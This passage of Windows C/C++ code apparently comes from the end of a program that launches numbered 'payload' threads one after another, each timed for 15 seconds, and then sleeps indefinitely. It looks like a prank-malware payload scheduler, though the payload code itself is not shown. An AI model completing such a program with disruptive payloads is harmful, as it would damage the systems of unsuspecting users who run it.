            CloseHandle(thread13dot3);
            CloseHandle(thread13dot4);
            CloseHandle(thread13dot5);
            HANDLE thread14 = CreateThread(0, 0, payload14, 0, 0, 0);
            Sleep(15000);
            TerminateThread(thread14, 0);
            CloseHandle(thread14);
            HANDLE thread15 = CreateThread(0, 0, payload15, 0, 0, 0);
            Sleep(15000);
            TerminateThread(thread15, 0);
            CloseHandle(thread15);
            Sleep(-1); //epic gamer move
        }
    }
}
